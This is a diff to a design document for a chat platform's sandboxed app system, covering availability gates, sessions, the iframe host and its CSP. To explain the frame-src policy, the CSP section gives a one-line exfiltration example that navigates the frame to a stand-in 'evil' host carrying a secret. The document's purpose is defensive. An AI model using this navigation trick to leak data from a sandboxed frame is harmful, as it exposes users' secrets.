@@ -75,7 +75,7 @@ Schema failures use `schema-unknown-key`, `schema-required`, `schema-type`, `sch
 
 ## The bridge
 
-The bridge is the message API (v1, `APP_PLATFORM_API = 1`) between the pqp page, the host, and a sandboxed app frame. The app is untrusted. Contract: `packages/shared/src/apps/bridge.ts`. The WebSocket frames between the pqp client and the API are in `packages/shared/src/apps/frames.ts` and are not part of the chat unions yet.
+The bridge is the message API (v1, `APP_PLATFORM_API = 1`) between the pqp page, the host, and a sandboxed app frame. The app is untrusted. Contract: `packages/shared/src/apps/bridge.ts`. The WebSocket frames between the pqp client and the API are in `packages/shared/src/apps/frames.ts`, listed in the chat unions as the session engine ships them (see "Sessions").
 
 ### Handshake
 
@@ -169,10 +169,80 @@ What to know:
 
 - `connect()` resolves with the app once the host's `hello` arrived (`app.hello`: platform version, app id and version, locale, theme, `self`). It rejects with `unavailable` when pqp does not answer in 15 seconds, and at once when the page is not inside a pqp frame. Call it once; a second call returns the same promise.
 - Listeners (`participants.on`, `state.on`, `events.on(name, cb)`, `app.on("connection" | "theme" | "ended", cb)`) return an unsubscribe function. Register them right after `connect()` and use the `get` calls for the value from before. A push that arrives before a listener exists is not replayed.
-- Every call returns a promise and rejects with a `PqpAppError` whose `code` is one of the bridge's codes (`not-allowed`, `not-host`, `too-large`, `rate-limited`, `stale-rev`, `cancelled`, `unavailable`, `ended`, `invalid`). A call the host does not answer within 15 seconds rejects with `unavailable`. After `ended` every call rejects with `ended`.
+- Every call returns a promise and rejects with a `PqpAppError` whose `code` is one of the bridge's codes (`not-allowed`, `not-host`, `too-large`, `rate-limited`, `stale-rev`, `cancelled`, `unavailable`, `ended`, `invalid`). A call the host does not answer within 15 seconds rejects with `unavailable`. After `ended` every call rejects with `ended`. A success the host sends must echo the request's `type` and carry the fields of its call (`events.send` and `end` answer `result: null`); a reply that names another call, omits the type or has a field of the wrong kind rejects with `unavailable`, so a write never looks done on the strength of someone else's answer.
 - `events.send` and `end` resolve to `null`. `files.pickLocal()` resolves to `{ bytes, ext }`, or `null` when the person cancels. `assets.get(name)` resolves to an `ArrayBuffer` the host already checked against the manifest's hash.
 - The app sees seat ids, display names and avatar data URLs, never pqp user ids. State is a JSON Merge Patch over one JSON value of at most 16 KB, events are at most 1 KB, and the manifest can lower both caps.
 - Theme: the host sends up to 64 CSS custom properties. `applyTheme(theme)` writes them on the document element through the CSSOM, which the frame's `style-src 'self'` allows.
+
+## Availability
+
+An app may run in a place only when every gate holds. `appAvailability(serverId, appId, { channelType })` in `server/src/apps/availability.ts` answers `{ available, reason }`, and `reason` is the FIRST gate that fails, in this order:
+
+| Reason | Gate |
+|---|---|
+| `flag-off` | The runtime flag `apps` is off for the server. |
+| `not-live` | `apps.status` is not `live`, or the app has no current version. |
+| `global-off` | `apps.global_enabled` (the operator's master switch) is off. |
+| `not-allowed-here` | `server_apps.operator_enabled` is not TRUE for this server. |
+| `owner-off` | The server's owner set `server_apps.owner_enabled` to FALSE. The owner can only remove what the operator allowed. |
+| `community-locked` | The server is a public community (`servers.is_community`) and the app has no `community_unlocked` safety decision. |
+| `emulator-off` | `category: "emulator"` also needs the flag `emulator_room` on the server. |
+| `channel-type` | The channel's type (`text` or `voice`) is not in the manifest's `channelTypes`. |
+| `no-origin` | The deployment has no `APPS_ORIGIN`, so no app can run. |
+
+D14: `appShareAllowed(serverId, app)` is true for every app except `category: "emulator"`, which also needs the flag `locadora_share` on the server (per server, default off, waiting for the lawyer's answer). The config carries it as `shareAllowed` and the session engine refuses `share.request` and spectator joins without it.
+
+### The apps origin
+
+`APPS_ORIGIN` names the separate, cookieless site that serves bundles (hosted: `https://pqp-apps.pages.dev`, local: `http://localhost:5175`). Unset, the config answers `origin: null` and every app is `no-origin`. Bundle addresses are `<origin>/<id>/<version>/<path>`, built by the server from the stored manifest, never from a request.
+
+### The catalog
+
+`server/src/apps/catalog.json` (`{ "apps": [ { "manifest": <built manifest>, "manifestSha256": "<hex>" } ] }`, written by the packager) is merged into `apps` and `app_versions` at boot by `loadAppCatalog`, on the API and the worker. The merge is insert-only: a new app arrives as `draft`, off everywhere, and a new version as `pending` review; the same (id, version) with a different `manifestSha256` is refused with a loud log; nothing ever changes the status, switches, review fields or `current_version` of an existing row, except that an app with no `current_version` gets the newest version the load inserted. Every insert writes an `app_admin_audit` row (`catalog-load`). The build copies the file into `dist/apps/`.
+
+On a dev box only (`DEV_AUTH_BYPASS=true` and `NODE_ENV` not `production`) apps of the `pqp` publisher are made `live`, `global_enabled` and `community_unlocked` at load, and the dev seed releases them on its Sandbox server, so a local checkout needs no dashboard. Turn the platform itself on with `APPS=true` in `.env`, and set `APPS_ORIGIN`.
+
+### The config route
+
+`GET /api/apps/config?serverId=` (member of the server, otherwise 404) answers `{ enabled, origin, apps }`, typed by `appsConfigSchema` in `packages/shared/src/apps/config.ts`. With the flag off, or with no `serverId`, it is `{ enabled: false, origin: null, apps: [] }`. Each `live` app is listed with `available` and `reason`, the entry and asset URLs, `shareAllowed`, and only the i18n keys a client draws (name, description, notice, presence) in all three locales.
+
+### Who may start
+
+`USE_APPS` is on `@everyone` of every server created from now on (`PERMISSION_NEW_SERVER_EVERYONE`), and on the moderator, manager and admin staff roles, which is what a new server is seeded with. It is not in `PERMISSION_DEFAULT_EVERYONE`, so a community only has it when its owner grants it.
+
+## Sessions
+
+One live session per channel, decided by the partial unique index `idx_app_sessions_one_live_per_channel`. Code: `server/src/apps/sessions.ts` (start, end), `server/src/apps/summary.ts` (the summary read from the rows), `server/src/ws/apps.ts` (fan-out), routes in `server/src/api/app-routes.ts`. Everything is behind the `apps` flag: with it off for the server, every route below answers 404 and no frame is sent.
+
+| Route | Answers |
+|---|---|
+| `POST /api/channels/:channelId/app-sessions` `{ appId }` | 201 with an `AppSessionSummary`. 404 channel unknown, not a server channel, not viewable, or flag off. 403 `app_unavailable` with `reason` (see Availability). 403 `cannot_start`. 409 `session_live` with `session`, the live one. 429 `rate_limited`. |
+| `GET /api/channels/:channelId/app-session` | The channel's `AppSessionSummary`, or `null`. |
+| `POST /api/app-sessions/:sessionId/end` | 200 `{ ended }`: `false` when it was already over. 403 `cannot_end`. |
+| `GET /api/servers/:serverId/app-sessions` | `{ sessions: [{ channelId, session }] }` for every channel of the server the caller can VIEW. The client asks on server open and on socket reconnect; the `/ws` welcome carries none of it. |
+
+A start checks, in order: the channel exists and the person can VIEW it; the flag; the app is available for the channel's type; the person holds the manifest's `requires.start` in THIS channel (USE_APPS always, so channel overwrites apply; `MANAGE_CHANNELS` on top when the manifest says so); no live session. In one transaction it inserts the session (`server_id` from the channel row, never from the request; the version pinned to `apps.current_version` at that instant) and a system message (`system_kind = 'app_session'`, body `<name> começou um app` for clients that do not know the kind), links it as `timeline_message_id`, and after the commit tells the channel (`message-broadcast`, then `channel-app`). The starter is host and is not joined.
+
+An end (`endSessionRow`) sets `status = 'ended'`, `end_reason`, `ended_by`, clears the state to `{}`, writes `summary = { participants, durationSeconds }` and stamps everyone still seated as left. Who may end: the host (`host`), someone with MANAGE_CHANNELS in the channel (`moderator`), an instance moderator (`operator`); the system ends with the other reasons. Ending a session that is over is a 200 no-op that tells nobody.
+
+Frames: `channel-app` `{ channelId, session: AppSessionSummary | null }` goes to every socket whose account can VIEW the channel (decision D13), on every instance, not only to sockets looking at the channel. A start and an end are sent at once and are never dropped; changes to a count are coalesced to one summary per 250 ms per channel. `app-ended` (reason and summary) goes to the sockets seated in the session AND to every other socket whose account can VIEW the channel, so the card on everybody's timeline turns into the quiet record. An app that leaves a small JSON object in `state.result` (a closed vote's tally, at most 512 compact bytes) has it copied into `summary.result` when the session ends, before the state is cleared; anything else is dropped. The timeline card is a message with `systemKind: "app_session"` and, on every read path (history, around, the single read, the live fan-out of the card), `appSession: { id, appId, appVersion, status, endReason, summary, startedBy }` joined through `app_sessions.timeline_message_id`, `null` once the session was retained away; search hits are snippets and carry no message payload. Row first, bus hint second: the bus carries only "this channel changed" and each instance reads the rows for its own sockets.
+
+## The frame host (web client)
+
+The pqp page runs an app in a sandboxed frame and is the only thing that talks to it. Code: `client/src/lib/apps/` (logic) and `client/src/components/apps/app-frame.tsx` (the React wrapper).
+
+- **`AppFrame`** renders a wrapper `div` (`data-status` is `loading`, `ready`, `error` or `ended`) and `mountAppFrame` (`lib/apps/frame-controller.ts`) puts one `<iframe sandbox="allow-scripts" allow="" referrerpolicy="no-referrer">` in it. Props: `app` (an entry of `GET /api/apps/config`, as `AppRuntimeConfig`), `appsOrigin`, `transport`, `users`, `title`, `locale`, `asSpectator`, `onStatus`, `onShare`. `onStatus` gets `{ kind: "loading" | "ready" }`, `{ kind: "error", reason, code? }` (`bad-entry`, `join-failed` with the transport's code, `timeout`, `frame-navigated`, `flood`) or `{ kind: "ended", reason }`. The seat is taken on mount and released on unmount.
+- **`AppSessionTransport`** (`lib/apps/types.ts`) is the whole interface to the server: `join`, `leave`, `patchState`, `sendEvent`, `end`, `subscribe` (handlers `onSession`, `onState`, `onEvent`, `onConnection`, `onEnded`). It maps one to one onto the `/ws` frames of `packages/shared/src/apps/frames.ts` and `POST /api/app-sessions/:id/end`. Participant changes reach the host as a fresh `app-session` snapshot (`onSession`): it is the only frame that carries seat ids next to user ids, so a roster change must be delivered to participants that way.
+- **The bridge host** (`lib/apps/bridge-host.ts`) parses every message with `bridgeAppMessageSchema` (strict: a failure is answered `invalid`, or dropped when it has no usable id), enforces the manifest again (event rate and bytes, state bytes counted on the MERGED state, who may write, `share` only for a `pane` app where sharing is allowed, `files.pickLocal` only when files are allowed), maps `AppTransportError` codes to bridge errors, builds participants from scratch (a seat id, a cleaned display name, an avatar data URL of at most 65536 characters or null, never a user id; one list holds at most 4 MiB of avatars, so past that the largest are left out and the app draws its fallback) and passes every answer and push through the bridge schemas (a successful answer echoes the request `type`). A flood is answered `rate-limited` without parsing and ends the frame if it keeps going.
+- **Files and assets.** `files.pickLocal` creates an `<input type=file>` in the PAGE (`accept` and the size cap from the manifest), reads the file and answers `{ bytes, ext }`; the file name is read once to find the extension and goes nowhere. `assets.get` fetches the manifest's asset with `cache: "force-cache"`, only from the apps origin (an asset URL anywhere else is refused without a request, and a redirect is an error), reading the body with the declared size as a hard limit, then checks the sha256 with `crypto.subtle` and transfers a copy; a mismatch answers `unavailable` and logs once, and concurrent requests for one asset share one fetch. Avatars are fetched only from `avatarOrigins` (the page's own origin and the API's; a user can set their avatar URL to anything), with a byte limit, a few at a time, and not at all once a roster's 4 MiB is spent.
+- **Theme.** `hello` and `theme` carry up to 64 CSS custom properties: an allowlist of the design tokens of `docs/DESIGN.md` (surfaces, borders, text, accent, status and soft pairs, radii, fonts, `--color-focus-ring`) read as the browser resolved them, plus `--pqp-color-scheme` (`light` or `dark`). A change of brightness, skin, contrast or accent hue pushes `theme` again. `reducedMotion` is the OS setting.
+- **Keyboard.** The frame is one tab stop and the page never traps focus or captures Escape; an app that traps focus fails review. `AppFrameHandle.focus()` puts focus on the frame from outside.
+
+**Why the page carries a CSP at all.** CSP inside the frame cannot stop a frame from navigating ITSELF (`location.href = "https://evil/?" + secret`, `<meta http-equiv=refresh>`, an anchor click): it is a navigation, and `navigate-to` does not exist. The only control is the embedding page's `frame-src` (S0 spike). pqp.gg has no CSP and a site-wide header is a bigger decision, so when the first app frame mounts the page inserts `<meta http-equiv="Content-Security-Policy" content="frame-src 'self' blob: <apps origin> <every origin the client frames>">`: `lib/apps/frame-policy.ts`. It carries `frame-src` only, so it constrains nothing else, and it stays for the life of the page. The origins are YouTube (`www.youtube.com`, `www.youtube-nocookie.com`), Twitch (`player.twitch.tv`, `clips.twitch.tv`), TikTok, Instagram, and Cloudflare Turnstile. Not Google sign-in (One Tap) and not Clerk's host: their flows carry a `state` or redirect parameter to a destination somebody else registered, which would let a navigating app frame hand data to it; a deployment that frames more passes it as an extra origin. Never a wildcard on a multi-tenant domain. `frame-policy.test.ts` checks every embed URL the shared builders produce against the list and fails when a new source file renders an iframe. The host also removes the frame on a second `load` event (it left the document it was given) and after 20 seconds without a `hello`. Both are in `client/e2e/app-frame/`, which runs the real controller, host and SDK in a sandboxed frame under the production CSP against a canary server, in Chromium, WebKit and Firefox: without the policy all three engines deliver `?secret=1` to the canary, with it none does, for `location.href`, `location.replace`, `location.assign`, `<meta refresh>` and an anchor click.
+
+Residual: the policy is page-wide, so a listed origin is also a place a hostile frame can send a query string to (with whatever the app was told). The listed embed hosts have no redirect to a destination the sender picks, so that data lands in a vendor's logs, not with the app's author. A structural fix (the app frame in a wrapper document whose `frame-src` is the apps origin alone) is a follow-up decision. WebKit opens a TCP connection for `<link rel=preconnect>` despite the CSP (S0 finding d).
+
+Run the browser suite with `pnpm --filter @pqp/client e2e:app-frame` (CI runs Chromium and Firefox; add `--project=webkit` locally).
 
 ## Packaging
 
@@ -227,8 +297,8 @@ The quiet "terminou" card needs something to say once the state is gone, and `ap
 
 ## Where things live
 
+- The frame host: `client/src/lib/apps/` (`bridge-host.ts`, `frame-controller.ts`, `frame-policy.ts`, `types.ts` for the transport interface), `client/src/components/apps/app-frame.tsx`; browser suite `client/e2e/app-frame/`.
 - The packager: `tools/apps-build/` (`bundle.mts` builds one app, `html.mts` SRI and the entry page rules, `headers.mts` CSP and `_headers`, `catalog.mts` the catalog and immutability, `dev-server.mts`, `cli.mts`). Apps: `apps/<name>/`. Output: `dist-apps/` (git-ignored); the committed result is `server/src/apps/catalog.json`.
-
 - The SDK: `packages/app-sdk/` (`@pqp/app-sdk`). `connect()` in `connect.ts`, the request and push plumbing in `client.ts`, the public object in `app.ts`. Tests use a fake host on a real `MessageChannel` (`fake-host.fixture.ts`).
 - Zod schemas, validator and constants: `packages/shared/src/apps/manifest.ts`
 - Presence formatter: `packages/shared/src/apps/presence.ts`
@@ -236,3 +306,4 @@ The quiet "terminou" card needs something to say once the state is gone, and `ap
 - JSON Schema for third parties: `packages/shared/schemas/app-manifest-1.schema.json`
 - Fixtures: `packages/shared/fixtures/app-manifests/` (`valid-*`, `invalid-schema-*` rejected by both schemas, `invalid-rule-*` accepted by the JSON Schema and rejected by the validator)
 - Tests: `packages/shared/src/apps/*.test.ts`. The parity test runs both schemas over every fixture, so the JSON file and the zod schema cannot drift apart. Change one, change the other, add a fixture.
+- Availability, catalog, config: `server/src/apps/{availability,catalog,config,origin}.ts`, route in `server/src/api/app-routes.ts`, client contract `packages/shared/src/apps/config.ts`
